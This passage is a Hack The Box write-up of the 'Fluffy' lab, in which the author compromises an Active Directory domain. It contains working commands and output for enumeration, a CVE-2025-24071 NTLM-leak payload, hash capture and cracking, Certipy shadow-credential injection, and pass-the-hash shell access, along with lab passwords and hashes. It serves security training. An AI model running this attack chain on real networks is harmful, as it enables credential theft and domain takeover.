<p class="indent-paragraph">  
This write-up details the end-to-end compromise of the <code>Fluffy</code> machine on Hack The Box. Starting with network reconnaissance and service enumeration, it demonstrates gaining initial access via SMB, exploiting a Windows File Explorer spoofing vulnerability to capture NTLM hashes, leveraging Kerberos for domain mapping, abusing Active Directory Certificate Services for shadow credential injection, and ultimately seizing full Administrator control through credential forging and extraction. Each phase builds on the last—culminating in a successful SYSTEM shell and flag retrieval.  
</p>


<p class="indent-paragraph">
Below is the achievement badge earned upon completing this machine, validating the successful exploitation of all required objectives.
</p><br>

<div style="text-align: center; margin-top: 1em;">
  <a href="https://www.hackthebox.com/achievement/machine/1007551/662" target="_blank" style="text-decoration: none; font-family: monospace; background: #0f0f0f; color: #00bfff; padding: 6px 12px; border: 1px solid #00bfff; border-radius: 6px; display: inline-block;">Fluffy Badge</a>
</div><br>

---
<br><p class="indent-paragraph">
As is common in real life Windows pentests, you will start the <code>Fluffy</code> box with credentials for the following account: 
<span class="blue">j.fleischman</span>:<span class="red">J0elTHEM4n1990!</span>
</p>


### 🧩 Enumeration and Initial Access

<p class="indent-paragraph">
An initial <code>full-TCP SYN</code> scan against all 65 535 ports (with host discovery disabled and a timing template of T4) confirmed that the target is alive and exposing a suite of Windows domain services. Open ports include <code>DNS</code> (53), <code>Kerberos</code> (88/464), <code>NetBIOS/SMB</code> (139/445), <code>LDAP</code> (389/636), <code>RPC/WS-Management</code> (593/5985), <code>AD Web Services</code> (9389), and several high ephemeral ports—all indicators of a <code>Domain Controller</code> role ready for further Active Directory enumeration.
</p>


```
~$ nmap -sS -Pn -T4 -p- <IP>

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 19:56 UTC
Nmap scan report for <IP>
Host is up (0.14s latency).
Not shown: 65516 filtered tcp ports (no-response)

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49689/tcp open  unknown
49704/tcp open  unknown
49719/tcp open  unknown
49746/tcp open  unknown
```

<p class="indent-paragraph">
The SMB share enumeration on the DC01 host revealed the default administrative shares <code>ADMIN$</code> and <code>C$</code><span class="codefix">,</span> the <code>IPC$</code> share for remote IPC access, as well as <code>NETLOGON</code> and <code>SYSVOL</code> for domain logon and policy distribution. Of particular interest was the <code>IT</code> share, which was granted both read and write permissions—offering a potential avenue to upload or exfiltrate sensitive files from the domain controller.
</p>

```
~$ nxc smb <ip> -u j.fleischman -p 'J0elTHEM4n1990!' --shares         
SMB         <ip>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         <ip>     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         <ip>     445    DC01             [*] Enumerated shares
SMB         <ip>     445    DC01             Share           Permissions     Remark
SMB         <ip>     445    DC01             -----           -----------     ------
SMB         <ip>     445    DC01             ADMIN$                          Remote Admin
SMB         <ip>     445    DC01             C$                              Default share
SMB         <ip>     445    DC01             IPC$            READ            Remote IPC
SMB         <ip>     445    DC01             IT              READ,WRITE      
SMB         <ip>     445    DC01             NETLOGON        READ            Logon server share 
SMB         <ip>     445    DC01             SYSVOL          READ            Logon server share 
```

<p class="indent-paragraph">
Since we now know the domain is <span class="blue">FLUFFY.HTB</span> and the hostname of the controller is simply<code>DC</code><span class="codefix">,</span> it’s a safe bet that<code>dc.fluffy.htb</code> will resolve internally. Adding this entry to our local resolver will allow us to refer to the domain controller by name instead of IP, which comes in handy when dealing with SMB, Kerberos, and other AD protocols. 
</p>

```
~$ nano /etc/hosts

<IP>   dc.fluffy.htb
```

### 🪪 SMB Enumeration

<p class="indent-paragraph">
Here we authenticate to the “IT” share on the domain controller using <code>smbclient</code> and the credentials we discovered. After connecting, we run <code>dir</code> to enumerate the contents and spot two interesting archives and an <code>Upgrade_Notice.pdf</code><span class="codefix">.</span> By issuing <code>get Upgrade_Notice.pdf</code><span class="codefix">,</span> we download the file to our local machine for further analysis. 
</p>

```
~$ smbclient //dc.fluffy.htb/IT -U=j.fleischman%'J0elTHEM4n1990!' -W FLUFFY.HTB
Try "help" to get a list of possible commands.

smb: \> dir
  .                                   D        0  Tue Jun 24 13:08:22 2025
  ..                                  D        0  Tue Jun 24 13:08:22 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

		5842943 blocks of size 4096. 2218600 blocks available

smb: \> get  Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (172.5 KiloBytes/sec) (average 172.5 KiloBytes/sec)
```

<p class="indent-paragraph">
The <code>Upgrade_Notice.pdf</code> isn’t just a notice—it’s a vulnerability assessment report for the domain controller. It catalogs six recent CVEs, including two critical flaws (CVE-2025-24996, CVE-2025-24071), two high-severity issues (CVE-2025-46785, CVE-2025-29968), one medium (CVE-2025-21193) and one low-severity finding (CVE-2025-3445). These entries point to immediate patching and configuration changes needed to harden the environment against known exploits.
</p>
<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/fluffy/fluffy-Upgrade_Notice.png" alt="Upgrade Notice" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
  To verify the OS without sifting through all the port details, we filter the Nmap output for its aggressive OS guess below. This focused approach immediately confirms the domain controller is a Windows host—most likely Windows Server 2019 or Windows 10 (1903–21H1).
</p>

```
~$ nmap -O dc.fluffy.htb | grep -E 'OS guesses' 

Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
```
### 💥 CVE-2025-24071 Exploitation

<p class="indent-paragraph">
To exploit <code>CVE-2025-24071</code><span class="codefix">,</span> you can use the public PoC at 
<a href="https://github.com/ThemeHackers/CVE-2025-24071" target="_blank">ThemeHackers/CVE-2025-24071</a>. It abuses Windows Explorer’s automatic parsing of <code>.library-ms</code> files by packing a malicious SMB path inside a RAR/ZIP. When the archive is extracted, Explorer sends an NTLM authentication request to the attacker-controlled server, leaking the user’s hash.
</p>

```
~$ git clone https://github.com/ThemeHackers/CVE-2025-24071.git

Cloning into 'CVE-2025-24071'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 14 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (14/14), 8.81 KiB | 2.20 MiB/s, done.
Resolving deltas: 100% (1/1), done.

~$ cd CVE-2025-24071

~$ python3 -m venv venv

~$ source ./venv/bin/activate

~$ pip install -r requirements.txt
```

<p class="indent-paragraph">
  Once executed, the exploit creates the <code>.library-ms</code> payload, bundles it into <code>exploit.zip</code><span class="codefix">,</span> and cleans up any temporary files. You then host <code>exploit.zip</code> over SMB (or another delivery method) and wait for the victim to extract it—this triggers an automatic SMB authentication to your listener, capturing the NTLM hash for subsequent Pass-the-Hash or relay attacks.
</p>

```
~$ python3 exploit.py -i <VPN> -f exploit                  
    
Creating exploit with filename: exploit.library-ms
Target IP: <VPN>

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
✓ Output file: exploit.zip

Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

<p class="indent-paragraph">
  Next, you’ll spin up an SMB server pointing at your payload directory and push the <code>exploit.zip</code> to the target’s share. This lets the victim machine automatically download and extract the library file, triggering the vulnerable behavior.
</p>

```
~$ mkdir shares
~$ mv exploit.zip shares/

~$ smbclient //dc.fluffy.htb/IT -U=j.fleischman%'J0elTHEM4n1990!' -c "put exploit.zip"

putting file exploit.zip as \exploit.zip (0.8 kb/s) (average 0.8 kb/s)
```

<p class="indent-paragraph">
By standing up an SMB listener via Impacket’s <samp>impacket-smbserver</samp> and waiting for the victim to connect, we successfully captured the NTLM hash of the account <strong>p.agila</strong>. This hash can now be subjected to offline cracking or relay attacks to further compromise the FLUFFY.HTB domain.
</p>

```
~$ sudo impacket-smbserver share ./shares -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (<VPN>,55491)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:ccf939947879f1314cf5f90b4f37ddaf:0101000000000000007f759edce4db01d266c473c229b8e8000000000100100041004e0073004e0069007500690070000300100041004e0073004e0069007500690070000200100058005700470065007600760063004900040010005800570047006500760076006300490007000800007f759edce4db010600040002000000080030003000000000000000010000000020000046a754fa62c0ada3cb48fdccac49fe5761de1598b12df2753f4ace5cd69968650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350031000000000000000000
```
### 🔓 Hash Analysis & Cracking

<p class="indent-paragraph">
To confirm the exact format of the captured credential blob, we ran it through <code>hashid</code><span class="codefix">.</span> The analysis clearly identifies it as <strong>NetNTLMv2</strong>, meaning we’re dealing with a modern NT LMv2 challenge–response hash. This tells us how to configure our cracking tools and ensures we select the correct attack mode for maximum efficiency.
</p>

```
~$ hashid "p.agila::FLUFFY:aaaaaaaaaaaaaaaa:ccf939947879f1314cf5f90b4f37ddaf:0101000000000000007f759edce4db01d266c473c229b8e8000000000100100041004e0073004e0069007500690070000300100041004e0073004e0069007500690070000200100058005700470065007600760063004900040010005800570047006500760076006300490007000800007f759edce4db010600040002000000080030003000000000000000010000000020000046a754fa62c0ada3cb48fdccac49fe5761de1598b12df2753f4ace5cd69968650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350031000000000000000000"

Analyzing 'p.agila::FLUFFY:aaaaaaaaaaaaaaaa:ccf939947879f1314cf5f90b4f37ddaf:0101000000000000007f759edce4db01d266c473c229b8e8000000000100100041004e0073004e0069007500690070000300100041004e0073004e0069007500690070000200100058005700470065007600760063004900040010005800570047006500760076006300490007000800007f759edce4db010600040002000000080030003000000000000000010000000020000046a754fa62c0ada3cb48fdccac49fe5761de1598b12df2753f4ace5cd69968650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350031000000000000000000'

[+] NetNTLMv2
```

<p class="indent-paragraph">
After running John the Ripper against our <code>hash.txt</code> using the <code>--format=netntlmv2</code> option and the RockYou wordlist, the tool cracked the hash in under a second. It revealed the plaintext password for <code>p.agila</code> as <strong>prometheusx-303</strong>, giving us valid credentials to move forward with authenticated exploits.
</p>

```
~$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt

Created directory: /home/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
~$ prometheusx-303  (p.agila)     
1g 0:00:00:01 DONE (2025-06-24 15:28) 0.6944g/s 3137Kp/s 3137Kc/s 3137KC/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

<p class="indent-paragraph">
The next step was to enumerate domain users via RID brute-forcing. <code>nxc</code> (NetExec), a modern and modular successor to CrackMapExec, proved ideal for the task. By leveraging the <code>--rid-brute</code> option, we prompted the domain controller to reveal internal identifiers tied to user accounts. RIDs (Relative Identifiers) are how Active Directory distinguishes users and groups under the hood. Even with low privileges, a properly filtered enumeration can reveal a surprising amount of structure within the environment.
</p>

```
~$ nxc smb dc.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}'

Administrator
Guest
krbtgt
DC01$
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```

<p class="indent-paragraph">
With a list of users gathered, the next logical step was to investigate group memberships. Using <code>ldapdomaindump</code><span class="codefix">,</span> we obtained a complete snapshot of the domain including users, groups, and their relationships. The resulting dump provided a clear overview of the environment’s structure and helped identify privileged accounts worth pursuing.
</p>

```
~$ ldapdomaindump dc.fluffy.htb -u 'FLUFFY.HTB\p.agila' -p 'prometheusx-303' 

[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

<p class="indent-paragraph">
After running <code>ldapdomaindump</code><span class="codefix">,</span> we inspected the generated <code>domain_users.html</code> report to map out key accounts within the domain. Besides the expected entries like <code>Administrator</code><span class="codefix">,</span><code>Guest</code><span class="codefix">,</span> and <code>krbtgt</code><span class="codefix">,</span> a few service and user accounts stood out. Notably, <code>p.agila</code> and <code>j.coffey</code> are both members of the <span class="blue">Service Account Managers</span> group — suggesting elevated privileges or operational roles. Other service accounts such as <code>winrm_svc</code><span class="codefix">,</span><code>ldap_svc</code><span class="codefix">,</span> and <code>ca_svc</code> appear embedded within <span class="blue">Service Accounts</span> and related technical groups.
</p>
<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/fluffy/ldap-domain-users.png" alt="LDAP Dump Table" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

### 🧾 BloodHound ACL Analysis

<p class="indent-paragraph">
After mapping out the domain users and their respective groups, the next logical step was to understand the relationships between them. BloodHound is a powerful tool for visualizing Active Directory trust paths and permission structures — and we didn’t want to miss any low-hanging escalation routes. Using the same credentials, we launched<code>bloodhound-python</code> to dump the AD metadata.
</p>


```
~$ bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -dc dc01.fluffy.htb -c All -ns <IP> 

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 26S
```

<p class="indent-paragraph">
To assess privilege escalation opportunities from the current user context, we loaded the collected data into <code>BloodHound</code> and initiated graph exploration from <code>p.agila@fluffy.htb</code><span class="codefix">.</span> The resulting visualization revealed that this user possesses direct and transitive privileges over several groups and service accounts — including <code>GenericAll</code><span class="codefix">,</span> <code>GenericWrite</code><span class="codefix">,</span> and <code>AddKeyCredentialLink</code> — which offer viable avenues for lateral movement and privilege escalation<span class="codefix">.</span> The following Cypher query was used to enumerate all reachable relationships: <code> MATCH p=(n:User {name: "P.AGILA@FLUFFY.HTB"})-[r*1..]->(m) RETURN p</code><span class="codefix">.</span>
</p>

<p class="indent-paragraph">
  <img src="/img/redteam/htb/fluffy/graph_1_pagila_fluffy_htb.png" alt="BloodHound graph" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

### 🔐 Shadow Credentials Injection

<p class="indent-paragraph">
During graph exploration from the context of <code>p.agila@fluffy.htb</code><span class="codefix">,</span> we identified that the user had transitive visibility into several service accounts and privileged groups. One notable finding was the account <code>WINRM_SVC@FLUFFY.HTB</code> being a direct member of the <span class="blue">Remote Management Users</span> group. This group grants access to WinRM (via <code>WSMan</code>), making its members suitable candidates for remote command execution through tools like <code>Evil-WinRM</code><span class="codefix">.</span> This discovery provided a viable path to achieve remote access by targeting accounts with legitimate permissions, reducing detection risk while maintaining operational integrity.
</p>

<p class="indent-paragraph">
  <img src="/img/redteam/htb/fluffy/graph_remote_management_users.png" alt="Remote Management Users group" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

<p class="indent-paragraph">
Following our initial enumeration in <code>BloodHound</code><span class="codefix">,</span> we identified a promising privilege escalation path starting from <code>p.agila@fluffy.htb</code><span class="codefix">.</span> The user is a member of the <span class="blue">Service Account Managers</span> group, which holds <code>GenericAll</code> rights over the <span class="blue">Service Accounts</span> group. This group in turn has <code>GenericWrite</code> permissions over several service accounts — most notably <code>WINRM_SVC@fluffy.htb</code><span class="codefix">.</span> This permission chain opened a reliable path to gain control over a user with remote execution capabilities. The relationship graph was retrieved using the following Cypher query: <code> MATCH p=(u:User {name: "P.AGILA@FLUFFY.HTB"})-[*1..]->(t:User {name: "WINRM_SVC@FLUFFY.HTB"}) RETURN p</code><span class="codefix">.</span>
</p>

<p class="indent-paragraph">
  <img src="/img/redteam/htb/fluffy/graph_2_pagila_fluffy_htb.png" alt="BloodHound graph - WINRM path" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

<p class="indent-paragraph">
By leveraging the <code>GenericWrite</code> privilege over <code>WINRM_SVC</code><span class="codefix">,</span> we were able to manipulate the account and proceed with a <strong>Shadow Credentials</strong> attack using <code>Certipy</code><span class="codefix">.</span> This technique injected a malicious <code>KeyCredential</code> into the account, authenticated via certificate-based login, and provided full access to the target context. As <code>WINRM_SVC</code> is a member of the <span class="blue">Remote Management Users</span> group, we seamlessly pivoted to remote shell access using <code>Evil-WinRM</code><span class="codefix">,</span> consolidating control without triggering unnecessary alarms.
</p>

```
~$ bloodyAD --host dc.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila

[+] p.agila added to Service Accounts
```

<p class="indent-paragraph">
  <span class="red">Note:</span> Kerberos-based authentication mechanisms are sensitive to time discrepancies between the client and the domain controller. If the local system clock is skewed, operations like ticket requests or certificate-based logins may fail with errors such as <code>KRB_AP_ERR_SKEW</code><span class="codefix">.</span> Since tools like <code>ntpdate</code> rely on UDP, the domain controller must be reachable — either directly or via a pivot tunnel (e.g., Ligolo) — for synchronization. To avoid such issues, we used a Bash script that queries the current time from the DC and updates the attacker's local system clock in UTC. This step is essential to ensure reliable Kerberos interactions during shadow credential injection and certificate abuse.
</p>

```
~$ cat sync_time_from_dc.sh

#!/bin/bash

# Prompt for the IP address of the Domain Controller
read -p "[?] Enter the IP address of the Domain Controller: " DC_IP

# Validate input
if [[ -z "$DC_IP" ]]; then
  echo "[-] No IP address provided. Exiting."
  exit 1
fi

echo "[*] Synchronizing local time with Domain Controller ($DC_IP)..."

# Execute ntpdate with root privileges to sync clock
if sudo ntpdate "$DC_IP"; then
  echo "[+] Local system time successfully synchronized with DC ($DC_IP)."
else
  echo "[-] Failed to synchronize time. Check connectivity or sudo permissions."
  exit 1
fi

~$ ./sync_time_from_dc.sh   
          
[?] Enter the IP address of the Domain Controller: <IP>
[*] Synchronizing local time with Domain Controller (<IP>)...
2025-05-11 01:54:18.196683 (-0300) +10823.540112 +/- 0.061235 <IP> s1 no-leap
CLOCK: time stepped by 10823.540112
[+] Local system time successfully synchronized with DC (<IP>).
```

<p class="indent-paragraph">
With inherited <code>GenericWrite</code> permissions over the <code>WINRM_SVC</code> account — as identified via BloodHound — we executed a <strong>Shadow Credentials</strong> attack using <code>Certipy</code><span class="codefix">.</span> After synchronizing the local time to match the domain controller and prevent Kerberos anomalies, we ran the <code>shadow auto</code> module against the target. This procedure generated a new certificate, injected a forged <code>msDS-KeyCredentialLink</code> entry into <code>WINRM_SVC</code><span class="codefix">,</span> and authenticated as the user using certificate-based login. The resulting Kerberos TGT was stored in a credential cache, allowing us to seamlessly extract the account’s <code>NT hash</code> while maintaining operational stealth — as <code>Certipy</code> automatically restored the original credentials post-exploitation.
</p>

```
~$ certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account winrm_svc
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd46d80c7-67d9-fd2b-574e-6a39e8d88bd1'
[*] Adding Key Credential with device ID 'd46d80c7-67d9-fd2b-574e-6a39e8d88bd1' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'd46d80c7-67d9-fd2b-574e-6a39e8d88bd1' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
~$ [*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

<p class="indent-paragraph">
To validate the integrity of the retrieved credentials, we authenticated against the domain controller <code>dc.fluffy.htb</code> using the <code>NT hash</code> via the <code>SMB</code> protocol. The tool <code>nxc</code> confirmed successful authentication as <code>WINRM_SVC</code><span class="codefix">,</span> verifying the effectiveness of the attack chain and setting the stage for remote execution using <code>Evil-WinRM</code> or similar tools.
</p>

```
~$ nxc smb dc.fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'         

SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         <IP>     445    DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767
```

<p class="indent-paragraph">
With confirmed membership of <code>WINRM_SVC</code> in the <span class="blue">Remote Management Users</span> group — as identified through <code>BloodHound</code> — we leveraged Evil-WinRM to establish a remote PowerShell session using the recovered <code>NT hash</code><span class="codefix">.</span> Since this group grants permission to interact with the host via the <code>WSMan</code> protocol, no administrative rights were necessary to obtain interactive access. This allowed us to pivot seamlessly into the target system while maintaining a low operational footprint. Once connected, we navigated to the user's desktop and successfully captured the first flag <code>user.txt</code><span class="codefix">,</span> confirming code execution within the compromised context.
</p>

```
~$ evil-winrm -i dc.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/15/2025   4:02 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
*********************************
```

### ⬆️ Privilege Escalation

<p class="indent-paragraph">
Following the initial foothold, we shifted focus toward identifying accounts with elevated interactions within the certificate infrastructure. While operating as <code>WINRM_SVC</code> in the context of <code>Evil-WinRM</code><span class="codefix">,</span> we executed an enumeration of the <span class="blue">Cert Publishers</span> group using PowerShell. This group plays a critical role in certificate operations and often includes accounts trusted by the Certificate Authority. The enumeration revealed two principals: the domain controller's machine account <code>DC01$</code> and the user account <code>ca_svc</code><span class="codefix">.</span> This discovery isolated <code>ca_svc</code> as the only user-level identity with potential influence over certificate publication workflows, marking it as a prime target for privilege escalation through certificate-based attacks.
</p>

```
~$ *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> Get-ADGroupMember -Identity "CERT PUBLISHERS"


distinguishedName : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
name              : certificate authority service
objectClass       : user
objectGUID        : dd971404-b662-443d-95db-1325e21fa032
SamAccountName    : ca_svc
SID               : S-1-5-21-497550768-2797716248-2627064577-1103

distinguishedName : CN=DC01,OU=Domain Controllers,DC=fluffy,DC=htb
name              : DC01
objectClass       : computer
objectGUID        : 188e7274-9c9b-45fb-b488-e6db23d6337f
SamAccountName    : DC01$
SID               : S-1-5-21-497550768-2797716248-2627064577-1000
```

<p class="indent-paragraph">
To further confirm the group membership, we parsed each member of the <span class="blue">Cert Publishers</span> group via LDAP resolution using PowerShell's ADSI interface. This yielded only two <code>sAMAccountName</code> entries: <code>ca_svc</code> and <code>DC01$</code><span class="codefix">.</span> This reinforced our previous finding — <code>ca_svc</code> is the only human-controlled account trusted by the certificate services, thus uniquely positioned for abuse in enrollment scenarios targeting the <code>User</code> template.
</p>

```
~$ *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> $group.Member | ForEach-Object { ([ADSI]("LDAP://$_")).sAMAccountName }

ca_svc
DC01$
```

<p class="indent-paragraph">
To visualize this relationship graphically, we executed a Cypher query within <code>BloodHound</code> to identify all users belonging to the <span class="blue">Cert Publishers</span> group. The result returned only the <code>CA_SVC@FLUFFY.HTB</code> node, reinforcing our earlier PowerShell findings.
</p>

<p class="indent-paragraph">
  <img src="/img/redteam/htb/fluffy/graph_cert_publishers_fluffy_htb.png" alt="Cert Publishers" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

<p class="indent-paragraph">
To escalate privileges without triggering alarms, we executed a <strong>Shadow Credentials</strong> attack against the <code>CA_SVC</code> account using the already-privileged user <code>p.agila</code><span class="codefix">.</span> By invoking the <code>shadow auto</code> module from <code>Certipy</code><span class="codefix">,</span> we injected a forged <code>KeyCredential</code> into the target account and authenticated via certificate to obtain a valid Kerberos TGT<span class="codefix">.</span> The operation concluded successfully with the generation of a <code>ca_svc.ccache</code> file and extraction of the <code>NT hash</code><span class="codefix">,</span> enabling full impersonation of the certificate authority service without password reuse or service disruption.
</p>

```
~$ certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account ca_svc
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '51389abb-1f80-b76c-f60a-a8ada11e3fd5'
[*] Adding Key Credential with device ID '51389abb-1f80-b76c-f60a-a8ada11e3fd5' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '51389abb-1f80-b76c-f60a-a8ada11e3fd5' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```


<p class="indent-paragraph">
With a valid <code>ccache</code> file obtained for the <code>CA_SVC</code> account — a privileged user identified as a member of the <span class="blue">Cert Publishers</span> group — we prepared the environment to execute Kerberos-authenticated operations without the need to reuse passwords or NT hashes<span class="codefix">.</span> By exporting the <code>KRB5CCNAME</code> environment variable to point to the <code>ca_svc.ccache</code> file, we enabled Kerberos-aware tools such as <code>impacket</code> to seamlessly use the embedded TGT for authentication<span class="codefix">.</span> This configuration establishes a stealthy and passwordless foothold for subsequent privilege escalation steps through legitimate Kerberos channels.
</p>

```
~$ export KRB5CCNAME=ca_svc.ccache

```

<p class="indent-paragraph">
To extract key attributes and verify the configuration of the <code>ca_svc</code> account — a privileged identity tied to certificate services — we employed the <code>account</code> module of <code>Certipy</code><span class="codefix">,</span> authenticated via NT hash<span class="codefix">.</span> This enumeration revealed metadata such as the <code>servicePrincipalName</code><span class="codefix">,</span> <code>userPrincipalName</code><span class="codefix">,</span> and <code>distinguishedName</code><span class="codefix">,</span> confirming the account’s association with the Active Directory Certificate Services (ADCS) infrastructure<span class="codefix">.</span> The presence of an SPN (<code>ADCS/ca.fluffy.htb</code>) further validates its role as a service account, which can be leveraged for Kerberos-based operations such as S4U abuse or certificate-based privilege escalation<span class="codefix">.</span>
</p>

```
~$ certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -user 'ca_svc' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-15T13:52:25+00:00
```

<p class="indent-paragraph">
